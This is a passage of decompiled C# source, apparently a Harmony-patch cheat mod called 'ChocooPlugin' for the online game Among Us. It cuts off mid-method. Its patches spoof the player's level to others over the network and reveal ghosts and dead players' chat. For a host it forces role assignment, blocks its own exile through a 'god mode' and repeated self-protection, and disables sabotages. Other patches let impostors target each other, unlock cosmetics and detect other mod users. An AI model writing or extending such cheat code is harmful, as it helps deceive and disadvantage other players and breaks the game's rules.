      PlayerControl localPlayer = PlayerControl.LocalPlayer;
      if (Object.op_Equality((Object) localPlayer, (Object) null))
        return;
      foreach (PlayerControl allPlayerControl in PlayerControl.AllPlayerControls)
      {
        if (Object.op_Inequality((Object) allPlayerControl, (Object) null) && Object.op_Inequality((Object) allPlayerControl.Data, (Object) null))
        {
          NetworkedPlayerInfo.PlayerOutfit defaultOutfit = allPlayerControl.Data.DefaultOutfit;
          if (defaultOutfit != null)
            localPlayer.RpcProtectPlayer(allPlayerControl, defaultOutfit.ColorId);
        }
      }
    }
  }

  [HarmonyPatch(typeof (PlayerPhysics), "FixedUpdate")]
  public static class SeeGhostsPatch
  {
    [HarmonyPostfix]
    public static void Postfix(PlayerPhysics __instance)
    {
      if (!ChocooPlugin.SeeGhostsEnabled)
        return;
      if (Object.op_Equality((Object) __instance?.myPlayer?.Data, (Object) null))
        return;
      try
      {
        if (!__instance.myPlayer.Data.IsDead || PlayerControl.LocalPlayer.Data.IsDead)
          return;
        __instance.myPlayer.Visible = true;
      }
      catch
      {
      }
    }
  }

  [HarmonyPatch(typeof (ChatController), "AddChat")]
  public static class ForceShowDeadChatPatch
  {
    private static bool _originalDeadState;
    private static bool _stateModified;

    [HarmonyPrefix]
    public static void Prefix(
      ChatController __instance,
      PlayerControl sourcePlayer,
      string chatText)
    {
      ChocooPlugin.ForceShowDeadChatPatch._stateModified = false;
      if (!ChocooPlugin.SeeGhostsEnabled || Object.op_Equality((Object) sourcePlayer?.Data, (Object) null) || !sourcePlayer.Data.IsDead || Object.op_Equality((Object) PlayerControl.LocalPlayer?.Data, (Object) null) || PlayerControl.LocalPlayer.Data.IsDead)
        return;
      ChocooPlugin.ForceShowDeadChatPatch._originalDeadState = PlayerControl.LocalPlayer.Data.IsDead;
      PlayerControl.LocalPlayer.Data.IsDead = true;
      ChocooPlugin.ForceShowDeadChatPatch._stateModified = true;
    }

    [HarmonyPostfix]
    public static void Postfix(ChatController __instance, PlayerControl sourcePlayer)
    {
      if (!ChocooPlugin.ForceShowDeadChatPatch._stateModified || Object.op_Equality((Object) PlayerControl.LocalPlayer?.Data, (Object) null))
        return;
      PlayerControl.LocalPlayer.Data.IsDead = ChocooPlugin.ForceShowDeadChatPatch._originalDeadState;
      ChocooPlugin.ForceShowDeadChatPatch._stateModified = false;
    }
  }

  [HarmonyPatch(typeof (PlayerControl), "HandleRpc")]
  public static class GhostChatRpcPatch
  {
    [HarmonyPostfix]
    public static void Postfix(PlayerControl __instance, byte callId, MessageReader reader)
    {
      if (callId != (byte) 8 || !ChocooPlugin.SeeGhostsEnabled || Object.op_Equality((Object) PlayerControl.LocalPlayer, (Object) null) || Object.op_Equality((Object) PlayerControl.LocalPlayer.Data, (Object) null) || PlayerControl.LocalPlayer.Data.IsDead || Object.op_Equality((Object) __instance, (Object) null) || Object.op_Equality((Object) __instance.Data, (Object) null))
        return;
      if (!__instance.Data.IsDead)
        return;
      try
      {
        int position = reader.Position;
        reader.Position = 0;
        string str = reader.ReadString();
        reader.Position = position;
        if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance?.Chat, (Object) null))
          return;
        DestroyableSingleton<HudManager>.Instance.Chat.AddChat(__instance, "[GHOST] " + str, true);
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("GhostChatRpc error: " + ex.Message));
      }
    }
  }

  [HarmonyPatch(typeof (HatManager), "Initialize")]
  public static class CosmeticsUnlockerPatch
  {
    [HarmonyPostfix]
    public static void Postfix(HatManager __instance)
    {
      // ISSUE: unable to decompile the method.
    }
  }

  [HarmonyPatch(typeof (AmongUsClient), "Update")]
  public static class SpoofLevelPatch
  {
    [HarmonyPostfix]
    public static void Postfix()
    {
      try
      {
        int spoofedLevel = ChocooPlugin.SpoofedLevel;
        if (spoofedLevel <= 0)
          return;
        DataManager.Player.Stats.Level = (uint) (spoofedLevel - 1);
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("SpoofLevel error: " + ex.Message));
      }
    }
  }

  [HarmonyPatch(typeof (InnerNetClient), "FixedUpdate")]
  public static class SpoofLevelInGamePatch
  {
    private static float cooldown;

    [HarmonyPostfix]
    public static void Postfix(InnerNetClient __instance)
    {
      try
      {
        int spoofedLevel = ChocooPlugin.SpoofedLevel;
        if (spoofedLevel <= 0)
          return;
        InnerNetClient.GameStates? gameState = ((InnerNetClient) AmongUsClient.Instance)?.GameState;
        if (gameState.GetValueOrDefault() != 2 && gameState.GetValueOrDefault() != 1)
          return;
        ChocooPlugin.SpoofLevelInGamePatch.cooldown -= Time.fixedDeltaTime;
        if ((double) ChocooPlugin.SpoofLevelInGamePatch.cooldown > 0.0)
          return;
        PlayerControl localPlayer = PlayerControl.LocalPlayer;
        if (!Object.op_Inequality((Object) localPlayer, (Object) null) || !Object.op_Inequality((Object) localPlayer.Data, (Object) null))
          return;
        uint playerLevel = localPlayer.Data.PlayerLevel;
        uint num = (uint) (spoofedLevel - 1);
        if ((int) playerLevel != (int) num)
        {
          localPlayer.RpcSetLevel(num);
          ChocooPlugin.SpoofLevelInGamePatch.cooldown = 0.5f;
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("SpoofLevelInGame error: " + ex.Message));
      }
    }
  }

  [HarmonyPatch(typeof (FindAGameManager), "Start")]
  public static class ExtendedLobbyListPatch
  {
    private static Scroller scroller;
    private static bool hasSetupExtendedList;

    [HarmonyPrefix]
    public static bool Prefix(FindAGameManager __instance)
    {
      if (!ChocooPlugin.ExtendedLobbyEnabled)
      {
        ChocooPlugin.ExtendedLobbyListPatch.Reset();
        return true;
      }
      try
      {
        if (ChocooPlugin.ExtendedLobbyListPatch.hasSetupExtendedList)
        {
          ChocooPlugin.ExtendedLobbyListPatch.hasSetupExtendedList = false;
          ChocooPlugin.ExtendedLobbyListPatch.scroller = (Scroller) null;
        }
        if (ChocooPlugin.ExtendedLobbyListPatch.hasSetupExtendedList)
          return true;
        GameContainer gameContainer1 = ((Il2CppArrayBase<GameContainer>) __instance.gameContainers)[4];
        GameObject gameObject1 = new GameObject("GameListScroller");
        gameObject1.transform.SetParent(((Component) gameContainer1).transform.parent);
        ChocooPlugin.ExtendedLobbyListPatch.scroller = gameObject1.AddComponent<Scroller>();
        ChocooPlugin.ExtendedLobbyListPatch.scroller.Inner = gameObject1.transform;
        ChocooPlugin.ExtendedLobbyListPatch.scroller.MouseMustBeOverToScroll = true;
        BoxCollider2D boxCollider2D = ((Component) ((Component) gameContainer1).transform.parent).gameObject.AddComponent<BoxCollider2D>();
        boxCollider2D.size = new Vector2(100f, 100f);
        ((PassiveUiElement) ChocooPlugin.ExtendedLobbyListPatch.scroller).ClickMask = (Collider2D) boxCollider2D;
        ChocooPlugin.ExtendedLobbyListPatch.scroller.ScrollWheelSpeed = 0.3f;
        ChocooPlugin.ExtendedLobbyListPatch.scroller.SetYBoundsMin(0.0f);
        ChocooPlugin.ExtendedLobbyListPatch.scroller.SetYBoundsMax(3.5f);
        ChocooPlugin.ExtendedLobbyListPatch.scroller.allowY = true;
        foreach (GameContainer gameContainer2 in (Il2CppArrayBase<GameContainer>) __instance.gameContainers)
        {
          ((Component) gameContainer2).transform.SetParent(gameObject1.transform);
          Vector3 position = ((Component) gameContainer2).transform.position;
          ((Component) gameContainer2).transform.position = new Vector3(position.x, position.y, 25f);
        }
        List<GameContainer> gameContainerList = new List<GameContainer>((IEnumerable<GameContainer>) __instance.gameContainers);
        for (int index = 0; index < 15; ++index)
        {
          GameContainer gameContainer3 = Object.Instantiate<GameContainer>(gameContainer1, gameObject1.transform);
          Vector3 position = ((Component) gameContainer3).transform.position;
          ((Component) gameContainer3).transform.position = new Vector3(position.x, position.y - 0.75f * (float) (index + 1), 25f);
          gameContainerList.Add(gameContainer3);
        }
        __instance.gameContainers = Il2CppReferenceArray<GameContainer>.op_Implicit(gameContainerList.ToArray());
        GameObject gameObject2 = new GameObject("CutOffTop");
        SpriteRenderer spriteRenderer = gameObject2.AddComponent<SpriteRenderer>();
        Texture2D texture2D = new Texture2D(100, 100);
        Color[] colorArray = Il2CppArrayBase<Color>.op_Implicit((Il2CppArrayBase<Color>) texture2D.GetPixels());
        for (int index = 0; index < colorArray.Length; ++index)
          colorArray[index] = Color.black;
        texture2D.SetPixels(Il2CppStructArray<Color>.op_Implicit(colorArray));
        texture2D.Apply();
        Sprite sprite = Sprite.Create(texture2D, new Rect(0.0f, 0.0f, 1f, 1f), Vector2.op_Multiply(Vector2.one, 0.5f));
        spriteRenderer.sprite = sprite;
        gameObject2.transform.SetParent(gameObject1.transform.parent);
        gameObject2.transform.localPosition = new Vector3(0.0f, 3f, 1f);
        gameObject2.transform.localScale = new Vector3(1500f, 200f, 100f);
        ChocooPlugin.ExtendedLobbyListPatch.hasSetupExtendedList = true;
        return true;
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("ExtendedLobbyList error: " + ex.Message));
        ChocooPlugin.ExtendedLobbyListPatch.Reset();
        return true;
      }
    }

    [HarmonyPatch(typeof (FindAGameManager), "RefreshList")]
    [HarmonyPostfix]
    public static void RefreshList_Postfix()
    {
      try
      {
        if (!ChocooPlugin.ExtendedLobbyEnabled || !Object.op_Inequality((Object) ChocooPlugin.ExtendedLobbyListPatch.scroller, (Object) null))
          return;
        ChocooPlugin.ExtendedLobbyListPatch.scroller.ScrollRelative(new Vector2(0.0f, -100f));
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("ExtendedLobbyList RefreshList error: " + ex.Message));
      }
    }

    public static void Reset()
    {
      ChocooPlugin.ExtendedLobbyListPatch.hasSetupExtendedList = false;
      ChocooPlugin.ExtendedLobbyListPatch.scroller = (Scroller) null;
    }
  }

  [HarmonyPatch(typeof (GameManager), "RpcEndGame")]
  public static class DisableGameEndPatch
  {
    [HarmonyPrefix]
    public static bool Prefix()
    {
      return ChocooPlugin.isForcingGameEnd || (!ChocooPlugin.TaskSpeedrunEnabled || !((InnerNetClient) AmongUsClient.Instance).AmHost) && (!ChocooPlugin.DisableGameEndEnabled || !((InnerNetClient) AmongUsClient.Instance).AmHost);
    }
  }

  [HarmonyPatch(typeof (RoleManager), "SelectRoles")]
  public static class ForceRolePatch
  {
    [HarmonyPrefix]
    public static bool Prefix(RoleManager __instance)
    {
      if (ChocooPlugin.forcedRoles.Count == 0 || !((InnerNetClient) AmongUsClient.Instance).AmHost)
        return true;
      try
      {
        ChocooPlugin.Logger.LogInfo((object) "=== CUSTOM ROLE ASSIGNMENT START ===");
        Il2CppArrayBase<PlayerControl> array = PlayerControl.AllPlayerControls.ToArray();
        IGameOptions currentGameOptions = GameOptionsManager.Instance.CurrentGameOptions;
        List<byte> assignedPlayers = new List<byte>();
        foreach (KeyValuePair<int, RoleTypes> forcedRole in ChocooPlugin.forcedRoles)
        {
          int playerId = forcedRole.Key;
          RoleTypes roleTypes = forcedRole.Value;
          PlayerControl playerControl = ((IEnumerable<PlayerControl>) array).FirstOrDefault<PlayerControl>((Func<PlayerControl, bool>) (p => Object.op_Inequality((Object) p, (Object) null) && (int) p.PlayerId == playerId));
          if (!Object.op_Equality((Object) playerControl, (Object) null))
          {
            playerControl.RpcSetRole(roleTypes, false);
            assignedPlayers.Add(playerControl.PlayerId);
            ChocooPlugin.Logger.LogInfo((object) $"✓ Forced {playerControl.Data.PlayerName} to {roleTypes.ToString()}");
          }
        }
        ChocooPlugin.ForceRolePatch.AssignRemainingRoles(Il2CppArrayBase<PlayerControl>.op_Implicit(array), assignedPlayers, currentGameOptions);
        ChocooPlugin.Logger.LogInfo((object) "=== CUSTOM ROLE ASSIGNMENT COMPLETE ===");
        return false;
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Force role error: " + ex.Message));
        return true;
      }
    }

    private static void AssignRemainingRoles(
      PlayerControl[] allPlayers,
      List<byte> assignedPlayers,
      IGameOptions options)
    {
      try
      {
        int num1 = 0;
        foreach (byte assignedPlayer in assignedPlayers)
        {
          byte playerId = assignedPlayer;
          PlayerControl playerControl = ((IEnumerable<PlayerControl>) allPlayers).FirstOrDefault<PlayerControl>((Func<PlayerControl, bool>) (p => Object.op_Inequality((Object) p, (Object) null) && (int) p.PlayerId == (int) playerId));
          if (Object.op_Inequality((Object) playerControl, (Object) null) && Object.op_Inequality((Object) playerControl.Data, (Object) null) && Object.op_Inequality((Object) playerControl.Data.Role, (Object) null) && playerControl.Data.Role.IsImpostor)
            ++num1;
        }
        int num2 = options.GetInt((Int32OptionNames) 1);
        int num3 = Mathf.Max(0, num2 - num1);
        ChocooPlugin.Logger.LogInfo((object) $"Assigning {num3.ToString()} more impostors (total: {num2.ToString()})");
        List<PlayerControl> list = ((IEnumerable<PlayerControl>) allPlayers).Where<PlayerControl>((Func<PlayerControl, bool>) (p => Object.op_Inequality((Object) p, (Object) null) && !assignedPlayers.Contains(p.PlayerId))).ToList<PlayerControl>();
        for (int index1 = list.Count - 1; index1 > 0; --index1)
        {
          int index2 = Random.Range(0, index1 + 1);
          PlayerControl playerControl = list[index1];
          list[index1] = list[index2];
          list[index2] = playerControl;
        }
        for (int index = 0; index < num3 && index < list.Count; ++index)
        {
          PlayerControl playerControl = list[index];
          playerControl.RpcSetRole((RoleTypes) 1, false);
          assignedPlayers.Add(playerControl.PlayerId);
          ChocooPlugin.Logger.LogInfo((object) $"→ Auto-assigned {playerControl.Data.PlayerName} to Impostor");
        }
        foreach (PlayerControl allPlayer in allPlayers)
        {
          if (Object.op_Inequality((Object) allPlayer, (Object) null) && !assignedPlayers.Contains(allPlayer.PlayerId))
          {
            allPlayer.RpcSetRole((RoleTypes) 0, false);
            assignedPlayers.Add(allPlayer.PlayerId);
            ChocooPlugin.Logger.LogInfo((object) $"→ Auto-assigned {allPlayer.Data.PlayerName} to Crewmate");
          }
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("AssignRemainingRoles error: " + ex.Message));
      }
    }
  }

  [HarmonyPatch(typeof (VoteBanSystem))]
  public static class VotekickInfoPatch
  {
    [HarmonyPatch("AddVote")]
    [HarmonyPostfix]
    public static void Postfix(int srcClient, int clientId)
    {
      try
      {
        if (!ChocooPlugin.ShowVotekickInfo || Object.op_Equality((Object) AmongUsClient.Instance, (Object) null))
          return;
        string str1 = ((InnerNetClient) AmongUsClient.Instance).GetClient(srcClient)?.PlayerName ?? "Client " + srcClient.ToString();
        string str2 = ((InnerNetClient) AmongUsClient.Instance).GetClient(clientId)?.PlayerName ?? "Client " + clientId.ToString();
        string str3 = $"<color=orange>[Votekick Info]</color> <color=blue>{str1}</color> voted to kick <color=red>{str2}</color>";
        if (Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) && Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Chat, (Object) null) && Object.op_Inequality((Object) PlayerControl.LocalPlayer, (Object) null))
          DestroyableSingleton<HudManager>.Instance.Chat.AddChat(PlayerControl.LocalPlayer, str3, true);
        ChocooPlugin.Logger.LogInfo((object) $"[Votekick Info] {str1} voted to kick {str2}");
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Votekick Info error: " + ex.Message));
      }
    }
  }

  [HarmonyPatch(typeof (AmongUsClient), "OnGameJoined")]
  public static class AutoCopyCode_Patch
  {
    public static string LastGameCode = "";

    public static void Postfix(string gameIdString)
    {
      if (!string.IsNullOrEmpty(gameIdString))
        ChocooPlugin.AutoCopyCode_Patch.LastGameCode = gameIdString;
      ChocooPlugin.notifiedBlacklistedPlayers.Clear();
      ChocooPlugin.notifiedAbnormalPlatformPlayers.Clear();
      ChocooPlugin.notifiedAbnormalLevelPlayers.Clear();
      ChocooPlugin.BanBlacklistedOnJoinPatch.Reset();
      ChocooPlugin.ChocooAnticheat_AbnormalPlatforms.Reset();
      ChocooPlugin.detectedModUsers.Clear();
    }
  }

  [HarmonyPatch(typeof (DisconnectPopup), "DoShow")]
  public static class CopyCodeOnDisconnect_Patch
  {
    public static void Postfix(DisconnectPopup __instance)
    {
      try
      {
        if (!ChocooPlugin.AutoCopyCodeEnabled || string.IsNullOrEmpty(ChocooPlugin.AutoCopyCode_Patch.LastGameCode) || ((InnerNetClient) AmongUsClient.Instance).LastDisconnectReason == 1)
          return;
        GUIUtility.systemCopyBuffer = ChocooPlugin.AutoCopyCode_Patch.LastGameCode;
        ChocooPlugin.Logger.LogInfo((object) ("Copied lobby code on disconnect: " + ChocooPlugin.AutoCopyCode_Patch.LastGameCode));
        TextMeshPro textArea = __instance._textArea;
        ((TMP_Text) textArea).text = ((TMP_Text) textArea).text + "\n\n<size=60%>Lobby code has been copied to clipboard.</size>";
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Copy Code on Disconnect error: " + ex.Message));
      }
    }
  }

  [HarmonyPatch(typeof (SabotageSystemType), "UpdateSystem")]
  public static class DisableSabotagesPatch
  {
    [HarmonyPrefix]
    public static bool Prefix()
    {
      return !ChocooPlugin.DisableSabotagesEnabled || !((InnerNetClient) AmongUsClient.Instance).AmHost;
    }
  }

  [HarmonyPatch(typeof (ShipStatus), "CloseDoorsOfType")]
  public static class DisableDoorSabotagesPatch
  {
    [HarmonyPrefix]
    public static bool Prefix(ShipStatus __instance, SystemTypes room)
    {
      if (!ChocooPlugin.DisableSabotagesEnabled || !((InnerNetClient) AmongUsClient.Instance).AmHost)
        return true;
      ChocooPlugin.Logger.LogInfo((object) ("Blocked door sabotage attempt for room: " + room.ToString()));
      return false;
    }
  }

  [HarmonyPatch(typeof (SabotageButton), "DoClick")]
  public static class DisableSabotageButtonPatch
  {
    [HarmonyPrefix]
    public static bool Prefix()
    {
      if (!ChocooPlugin.DisableSabotagesEnabled || !((InnerNetClient) AmongUsClient.Instance).AmHost)
        return true;
      ChocooPlugin.Logger.LogInfo((object) "Blocked manual sabotage button click");
      if (Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) && Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
        DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage("Sabotages are disabled by host!");
      return false;
    }
  }

  [HarmonyPatch(typeof (MainMenuManager), "LateUpdate")]
  public static class MainMenuButtonColorPatch
  {
    public static void Postfix(MainMenuManager __instance)
    {
      if (!ChocooPlugin.CustomButtonColorEnabled || ChocooPlugin.DisableCustomTheme)
        return;
      try
      {
        PassiveButton[] passiveButtonArray = new PassiveButton[13]
        {
          __instance.playButton,
          __instance.inventoryButton,
          __instance.shopButton,
          __instance.playLocalButton,
          __instance.PlayOnlineButton,
          __instance.backButtonOnline,
          __instance.newsButton,
          __instance.myAccountButton,
          __instance.settingsButton,
          __instance.howToPlayButton,
          __instance.freePlayButton,
          __instance.accountCTAButton,
          __instance.accountStatsButton
        };
        foreach (PassiveButton passiveButton in passiveButtonArray)
        {
          if (Object.op_Inequality((Object) passiveButton, (Object) null) && Object.op_Inequality((Object) ((Component) passiveButton).gameObject, (Object) null))
            ChocooPlugin.ApplyButtonColor(((Component) passiveButton).gameObject, "Icon", "Background");
        }
      }
      catch (Exception ex)
      {
      }
    }
  }

  [HarmonyPatch(typeof (FindAGameManager), "Start")]
  public static class FindGameButtonColorPatch
  {
    public static void Postfix(FindAGameManager __instance)
    {
      if (!ChocooPlugin.CustomButtonColorEnabled || ChocooPlugin.DisableCustomTheme)
        return;
      try
      {
        if (Object.op_Inequality((Object) __instance.refreshButton, (Object) null) && Object.op_Inequality((Object) ((Component) __instance.refreshButton).gameObject, (Object) null))
          ChocooPlugin.ApplyButtonColor(((Component) __instance.refreshButton).gameObject);
        if (Object.op_Inequality((Object) __instance.BackButton, (Object) null) && Object.op_Inequality((Object) ((Component) __instance.BackButton).gameObject, (Object) null))
          ChocooPlugin.ApplyButtonColor(((Component) __instance.BackButton).gameObject);
        if (Object.op_Inequality((Object) __instance.clearFilterButton, (Object) null) && Object.op_Inequality((Object) ((Component) __instance.clearFilterButton).gameObject, (Object) null))
          ChocooPlugin.ApplyButtonColor(((Component) __instance.clearFilterButton).gameObject, "Disabled");
        if (!Object.op_Inequality((Object) __instance.serverButton, (Object) null) || !Object.op_Inequality((Object) ((Component) __instance.serverButton).gameObject, (Object) null))
          return;
        ChocooPlugin.ApplyButtonColor(((Component) __instance.serverButton).gameObject, "Inactive", "Disabled", "Background");
      }
      catch (Exception ex)
      {
      }
    }
  }

  [HarmonyPatch(typeof (LobbyViewSettingsPane), "Awake")]
  public static class LobbySettingsButtonColorPatch
  {
    public static void Postfix(LobbyViewSettingsPane __instance)
    {
      if (!ChocooPlugin.CustomButtonColorEnabled || ChocooPlugin.DisableCustomTheme)
        return;
      try
      {
        if (Object.op_Inequality((Object) __instance.backButton, (Object) null) && Object.op_Inequality((Object) ((Component) __instance.backButton).gameObject, (Object) null))
          ChocooPlugin.ApplyButtonColor(((Component) __instance.backButton).gameObject, "Icon");
        if (Object.op_Inequality((Object) __instance.taskTabButton, (Object) null) && Object.op_Inequality((Object) ((Component) __instance.taskTabButton).gameObject, (Object) null))
          ChocooPlugin.ApplyButtonColor(((Component) __instance.taskTabButton).gameObject, "Icon");
        if (!Object.op_Inequality((Object) __instance.rolesTabButton, (Object) null) || !Object.op_Inequality((Object) ((Component) __instance.rolesTabButton).gameObject, (Object) null))
          return;
        ChocooPlugin.ApplyButtonColor(((Component) __instance.rolesTabButton).gameObject, "Icon");
      }
      catch (Exception ex)
      {
      }
    }
  }

  [HarmonyPatch(typeof (GameStartManager), "Start")]
  public static class LobbyStartButtonColorPatch
  {
    public static void Postfix(GameStartManager __instance)
    {
      if (!ChocooPlugin.CustomButtonColorEnabled || ChocooPlugin.DisableCustomTheme)
        return;
      try
      {
        if (Object.op_Inequality((Object) __instance.StartButton, (Object) null) && Object.op_Inequality((Object) ((Component) __instance.StartButton).gameObject, (Object) null))
          ChocooPlugin.ApplyButtonColor(((Component) __instance.StartButton).gameObject, "Icon");
        if (Object.op_Inequality((Object) __instance.EditButton, (Object) null) && Object.op_Inequality((Object) ((Component) __instance.EditButton).gameObject, (Object) null))
          ChocooPlugin.ApplyButtonColor(((Component) __instance.EditButton).gameObject, "Icon");
        if (Object.op_Inequality((Object) __instance.ClientViewButton, (Object) null) && Object.op_Inequality((Object) ((Component) __instance.ClientViewButton).gameObject, (Object) null))
          ChocooPlugin.ApplyButtonColor(((Component) __instance.ClientViewButton).gameObject, "Icon");
        if (!Object.op_Inequality((Object) __instance.HostViewButton, (Object) null) || !Object.op_Inequality((Object) ((Component) __instance.HostViewButton).gameObject, (Object) null))
          return;
        ChocooPlugin.ApplyButtonColor(((Component) __instance.HostViewButton).gameObject, "Icon");
      }
      catch (Exception ex)
      {
      }
    }
  }

  [HarmonyPatch(typeof (PlayerControl))]
  public static class KillOtherImpostersPatch
  {
    [HarmonyPatch("FixedUpdate")]
    [HarmonyPostfix]
    public static void FixedUpdate_Postfix(PlayerControl __instance)
    {
      if (!ChocooPlugin.KillOtherImpostersEnabled || Object.op_Inequality((Object) __instance, (Object) PlayerControl.LocalPlayer) || !__instance.Data.Role.IsImpostor || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.KillButton, (Object) null))
        return;
      KillButton killButton = DestroyableSingleton<HudManager>.Instance.KillButton;
      PlayerControl playerControl = (PlayerControl) null;
      float num1 = float.MaxValue;
      foreach (PlayerControl allPlayerControl in PlayerControl.AllPlayerControls)
      {
        if (!Object.op_Equality((Object) allPlayerControl, (Object) null) && !Object.op_Equality((Object) allPlayerControl, (Object) __instance) && !allPlayerControl.Data.IsDead && !allPlayerControl.inVent)
        {
          float num2 = Vector2.Distance(__instance.GetTruePosition(), allPlayerControl.GetTruePosition());
          if ((double) num2 < (double) num1)
          {
            num1 = num2;
            playerControl = allPlayerControl;
          }
        }
      }
      if (Object.op_Inequality((Object) playerControl, (Object) null) && playerControl.Data.Role.IsImpostor)
        killButton.SetTarget(playerControl);
    }

    [HarmonyPatch("MurderPlayer")]
    [HarmonyPrefix]
    public static bool MurderPlayer_Prefix(PlayerControl __instance, PlayerControl target) => true;
  }

  [HarmonyPatch(typeof (MeetingHud))]
  public static class GodMode_CheckForEndVoting
  {
    [HarmonyPrefix]
    [HarmonyPatch("CheckForEndVoting")]
    public static bool Prefix(MeetingHud __instance)
    {
      int num1;
      if (ChocooPlugin.GodModeEnabled)
      {
        AmongUsClient instance = AmongUsClient.Instance;
        num1 = instance != null ? (!((InnerNetClient) instance).AmHost ? 1 : 0) : 0;
      }
      else
        num1 = 1;
      if (num1 != 0)
        return true;
      foreach (PlayerVoteArea playerState in (Il2CppArrayBase<PlayerVoteArea>) __instance.playerStates)
      {
        if (!playerState.AmDead && !playerState.DidVote)
          return true;
      }
      Dictionary<byte, int> dictionary = new Dictionary<byte, int>();
      foreach (PlayerVoteArea playerState in (Il2CppArrayBase<PlayerVoteArea>) __instance.playerStates)
      {
        if (playerState.DidVote && playerState.VotedFor != (byte) 252 && playerState.VotedFor != (byte) 253 && playerState.VotedFor != (byte) 254)
        {
          if (!dictionary.ContainsKey(playerState.VotedFor))
            dictionary[playerState.VotedFor] = 0;
          dictionary[playerState.VotedFor]++;
        }
      }
      byte num2 = byte.MaxValue;
      int num3 = 0;
      bool flag = false;
      foreach (KeyValuePair<byte, int> keyValuePair in dictionary)
      {
        if (keyValuePair.Value > num3)
        {
          num3 = keyValuePair.Value;
          num2 = keyValuePair.Key;
          flag = false;
        }
        else if (keyValuePair.Value == num3)
          flag = true;
      }
      NetworkedPlayerInfo networkedPlayerInfo = (NetworkedPlayerInfo) null;
      if (!flag && num2 != byte.MaxValue)
        networkedPlayerInfo = GameData.Instance.GetPlayerById(num2);
      byte? playerId = networkedPlayerInfo?.PlayerId;
      int? nullable1 = playerId.HasValue ? new int?((int) playerId.GetValueOrDefault()) : new int?();
      playerId = PlayerControl.LocalPlayer?.PlayerId;
      int? nullable2 = playerId.HasValue ? new int?((int) playerId.GetValueOrDefault()) : new int?();
      if (nullable1.GetValueOrDefault() == nullable2.GetValueOrDefault() & nullable1.HasValue == nullable2.HasValue)
      {
        networkedPlayerInfo = (NetworkedPlayerInfo) null;
        flag = false;
        ChocooPlugin.Logger.LogInfo((object) "\uD83D\uDEE1️ Blocked exile");
      }
      MeetingHud.VoterState[] voterStateArray = new MeetingHud.VoterState[((Il2CppArrayBase<PlayerVoteArea>) __instance.playerStates).Length];
      for (int index = 0; index < voterStateArray.Length; ++index)
        voterStateArray[index] = new MeetingHud.VoterState()
        {
          VoterId = ((Il2CppArrayBase<PlayerVoteArea>) __instance.playerStates)[index].TargetPlayerId,
          VotedForId = ((Il2CppArrayBase<PlayerVoteArea>) __instance.playerStates)[index].VotedFor
        };
      __instance.RpcVotingComplete(Il2CppStructArray<MeetingHud.VoterState>.op_Implicit(voterStateArray), networkedPlayerInfo, flag);
      return false;
    }
  }

  [HarmonyPatch(typeof (InnerNetClient), "FixedUpdate")]
  public static class GodMode_ContinuousShield
  {
    [HarmonyPostfix]
    public static void Postfix()
    {
      try
      {
        if (Object.op_Equality((Object) PlayerControl.LocalPlayer, (Object) null) || Object.op_Equality((Object) AmongUsClient.Instance, (Object) null))
          return;
        bool flag1 = Object.op_Inequality((Object) ShipStatus.Instance, (Object) null);
        bool flag2 = ((InnerNetClient) AmongUsClient.Instance).AmHost && ChocooPlugin.GodModeEnabled;
        if (!flag1 || !flag2 || (double) Time.time - (double) ChocooPlugin.lastGodModeProtectTime < 0.05000000074505806)
          return;
        ChocooPlugin.lastGodModeProtectTime = Time.time;
        PlayerControl localPlayer = PlayerControl.LocalPlayer;
        NetworkedPlayerInfo.PlayerOutfit defaultOutfit = localPlayer.Data?.DefaultOutfit;
        if (defaultOutfit == null)
          return;
        localPlayer.RpcProtectPlayer(localPlayer, defaultOutfit.ColorId);
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("GodMode shield error: " + ex?.ToString()));
      }
    }
  }

  [HarmonyPatch(typeof (AmongUsClient), "OnGameJoined")]
  public static class SendIdentificationOnJoinPatch
  {
    public static void Postfix()
    {
      if (ChocooPlugin.StealthMode || Object.op_Equality((Object) PlayerControl.LocalPlayer, (Object) null) || Object.op_Equality((Object) AmongUsClient.Instance, (Object) null))
        return;
      ChocooPlugin.TrackOwnModUsage();
      ((MonoBehaviour) PlayerControl.LocalPlayer).StartCoroutine(Effects.Lerp(2f, Action<float>.op_Implicit((Action<float>) (t =>
      {
        if ((double) t < 1.0)
          return;
        ChocooPlugin.BroadcastMenuIdentification();
      }))));
    }
  }

  [HarmonyPatch(typeof (PlayerControl), "HandleRpc")]
  public static class ModUserDetectionPatch
  {
    private static readonly HashSet<byte> knownModRPCs = new HashSet<byte>()
    {
      (byte) 121,
      (byte) 167,
      (byte) 164,
      (byte) 85,
      (byte) 150,
      (byte) 250,
      (byte) 176 /*0xB0*/,
      (byte) 154,
      (byte) 162,
      (byte) 219,
      (byte) 202,
      (byte) 89,
      byte.MaxValue
    };

    [HarmonyPrefix]
    public static bool Prefix(PlayerControl __instance, byte callId, MessageReader reader)
    {
      if (!ChocooPlugin.ModUserDetectionPatch.knownModRPCs.Contains(callId))
        return true;
      try
      {
        if (ChocooPlugin.SeeModUsersEnabled)
        {
          byte playerId = __instance.PlayerId;
          float time = Time.time;
          if (ChocooPlugin.lastDetectionTime.ContainsKey(playerId) && (double) time - (double) ChocooPlugin.lastDetectionTime[playerId] < 2.0)
            return false;
          switch (callId)
          {
            case 121:
              try
              {
                if (MessageReader.Get(reader).ReadString() != "CHOCOO_PING")
                  return false;
              }
              catch
              {
              }
              break;
